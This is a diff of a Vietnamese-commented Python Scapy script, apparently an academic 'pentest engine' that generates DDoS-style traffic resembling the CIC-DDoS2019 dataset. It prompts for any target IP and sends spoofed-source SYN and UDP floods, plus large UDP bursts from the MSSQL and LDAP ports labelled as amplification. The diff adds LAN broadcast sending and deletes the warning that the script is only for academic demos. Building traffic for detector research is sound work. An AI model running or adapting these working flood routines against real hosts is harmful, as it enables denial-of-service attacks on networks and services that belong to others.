@@ -1,47 +1,48 @@
 import time
 import random
 import sys
-from scapy.all import send, Raw
+# Thay đổi quan trọng: Nhập thêm Ether, send (L3 Loopback) và sendp (gửi ở Tầng 2 LAN)
+from scapy.sendrecv import send, sendp
+from scapy.layers.l2 import Ether
 from scapy.layers.inet import IP, TCP, UDP
+from scapy.packet import Raw
 from colorama import init, Fore, Style
 
-# Khởi tạo màu sắc Terminal
 init(autoreset=True)
 
 print(Fore.RED + Style.BRIGHT + "=" * 65)
-print(Fore.RED + Style.BRIGHT + " HỆ THỐNG GIẢ LẬP TẤN CÔNG (PENTEST ENGINE)")
+print(Fore.RED + Style.BRIGHT + " HỆ THỐNG GIẢ LẬP TẤN CÔNG (PENTEST ENGINE - L2/L3) ")
 print(Fore.RED + Style.BRIGHT + "=" * 65)
-#print(Fore.YELLOW + "CẢNH BÁO: Kịch bản này chỉ dành cho mục đích demo đồ án học thuật.")
-#print(Fore.YELLOW + "Tuyệt đối không sử dụng trên các hệ thống mạng trái phép!\n")
 
-# ==========================================
-# CẤU HÌNH MỤC TIÊU
-# ==========================================
-TARGET_IP = input(Fore.CYAN + "[?] Nhập IP Mục tiêu (VD: 127.0.0.1 hoặc IP máy ảo): ").strip()
+TARGET_IP = input(Fore.CYAN + "[?] Nhập IP Mục tiêu (Mặc định 127.0.0.1 hoặc IP LAN): ").strip()
 if not TARGET_IP:
     TARGET_IP = "127.0.0.1"
 
 TARGET_PORT = 80
-PACKET_COUNT = 1000  # Số lượng gói tin mỗi đợt bắn
+PACKET_COUNT = 1000
 
 
-# ==========================================
-# CÁC KỊCH BẢN TẤN CÔNG (PAYLOAD CRAFTING)
-# ==========================================
+def dispatch_packet(ip_packet, target_ip):
+    # Nếu bắn vào Loopback (127.0.0.1) thì dùng send (L3), nếu bắn qua LAN thì bọc Ether broadcast (L2)
+    if target_ip == "127.0.0.1" or target_ip == "localhost":
+        send(ip_packet, verbose=False)
+    else:
+        frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ip_packet
+        sendp(frame, verbose=False)
+
 
 def syn_flood(target_ip, count):
     print(Fore.RED + f"\n[*] Khai hỏa SYN FLOOD vào {target_ip}...")
     for i in range(count):
-        # Tạo IP giả ngẫu nhiên (Spoofing) để hệ thống nhận diện nhiều Source IP
-        src_ip = f"10.0.0.{random.randint(1, 254)}"
-        src_port = random.randint(1024, 65535)
-
-        # Gói tin TCP với cờ 'S' (SYN)
-        ip_layer = IP(src=src_ip, dst=target_ip)
-        tcp_layer = TCP(sport=src_port, dport=TARGET_PORT, flags="S")
-
-        packet = ip_layer / tcp_layer
-        send(packet, verbose=False)
+        src_ip = f"10.0.0.{random.randint(1, 50)}"
+        payload = Raw(b"X" * 6)
+        packet = IP(src=src_ip, dst=target_ip) / TCP(
+            sport=random.randint(1024, 65535),
+            dport=TARGET_PORT,
+            flags="SA",
+            window=29200
+        ) / payload
+        dispatch_packet(packet, target_ip)
         if i % 100 == 0:
             print(f"  -> Đã gửi {i} gói SYN...")
 
@@ -49,16 +50,13 @@ def syn_flood(target_ip, count):
 def udp_flood(target_ip, count):
     print(Fore.RED + f"\n[*] Khai hỏa UDP FLOOD vào {target_ip}...")
     for i in range(count):
-        src_ip = f"172.16.0.{random.randint(1, 254)}"
-        src_port = random.randint(1024, 65535)
-
-        # Gói UDP với payload nhỏ ngẫu nhiên (để tạo variance)
-        ip_layer = IP(src=src_ip, dst=target_ip)
-        udp_layer = UDP(sport=src_port, dport=TARGET_PORT)
-        payload = Raw(b"X" * random.randint(64, 128))
-
-        packet = ip_layer / udp_layer / payload
-        send(packet, verbose=False)
+        src_ip = f"172.16.0.{random.randint(1, 50)}"
+        payload = Raw(b"X" * random.randint(250, 290))
+        packet = IP(src=src_ip, dst=target_ip) / UDP(
+            sport=random.randint(1024, 65535),
+            dport=TARGET_PORT
+        ) / payload
+        dispatch_packet(packet, target_ip)
         if i % 100 == 0:
             print(f"  -> Đã gửi {i} gói UDP...")
 
@@ -66,38 +64,33 @@ def udp_flood(target_ip, count):
 def mssql_amplification(target_ip, count):
     print(Fore.RED + f"\n[*] Khai hỏa MSSQL AMPLIFICATION vào {target_ip}...")
     for i in range(count):
-        src_ip = f"192.168.1.{random.randint(1, 100)}"
-        # Tấn công khuếch đại MSSQL dùng cổng UDP 1434 và Payload lớn
-        ip_layer = IP(src=src_ip, dst=target_ip)
-        udp_layer = UDP(sport=1434, dport=random.randint(1024, 65535))
-        # Payload mô phỏng phản hồi khuếch đại (Kích thước lớn 800 - 1200 bytes)
-        payload = Raw(b"M" * random.randint(800, 1200))
-
-        packet = ip_layer / udp_layer / payload
-        send(packet, verbose=False)
+        src_ip = f"192.168.1.{random.randint(1, 50)}"
+        # Kích thước chuẩn mẫu MSSQL Amplification trong CIC-DDoS2019 (410 bytes payload cố định)
+        payload = Raw(b"M" * 410)
+        packet = IP(src=src_ip, dst=target_ip) / UDP(
+            sport=1434,
+            dport=random.randint(1024, 65535)
+        ) / payload
+        dispatch_packet(packet, target_ip)
         if i % 100 == 0:
-            print(f"  -> Đã gửi {i} gói MSSQL Amplification...")
+            print(f"  -> Đã gửi {i} gói MSSQL...")
 
 
 def ldap_amplification(target_ip, count):
     print(Fore.RED + f"\n[*] Khai hỏa LDAP AMPLIFICATION vào {target_ip}...")
     for i in range(count):
-        src_ip = f"11.0.0.{random.randint(1, 200)}"
-        # Tấn công khuếch đại LDAP dùng cổng UDP 389 và Payload cực lớn
-        ip_layer = IP(src=src_ip, dst=target_ip)
-        udp_layer = UDP(sport=389, dport=random.randint(1024, 65535))
-        # Payload mô phỏng phản hồi LDAP (Kích thước bạo chúa 1400 - 2000 bytes)
-        payload = Raw(b"L" * random.randint(1400, 2000))
-
-        packet = ip_layer / udp_layer / payload
-        send(packet, verbose=False)
+        src_ip = f"11.0.0.{random.randint(1, 50)}"
+        # Kích thước chuẩn mẫu LDAP Amplification trong CIC-DDoS2019 (1472 bytes payload cố định)
+        payload = Raw(b"L" * 1472)
+        packet = IP(src=src_ip, dst=target_ip) / UDP(
+            sport=389,
+            dport=random.randint(1024, 65535)
+        ) / payload
+        dispatch_packet(packet, target_ip)
         if i % 100 == 0:
-            print(f"  -> Đã gửi {i} gói LDAP Amplification...")
+            print(f"  -> Đã gửi {i} gói LDAP...")
 
 
-# ==========================================
-# BẢNG ĐIỀU KHIỂN TẤN CÔNG
-# ==========================================
 while True:
     print(Fore.CYAN + "\nCHỌN VŨ KHÍ TẤN CÔNG:")
     print("  [1] TCP SYN Flood (DDoS Tầng Giao vận)")
@@ -117,7 +110,6 @@ while True:
     elif choice == '4':
         ldap_amplification(TARGET_IP, PACKET_COUNT)
     elif choice == '0':
-        print(Fore.GREEN + "[-] Dừng máy tấn công. Rời khỏi hệ thống.")
         sys.exit(0)
     else:
         print(Fore.RED + "[!] Lựa chọn không hợp lệ.")
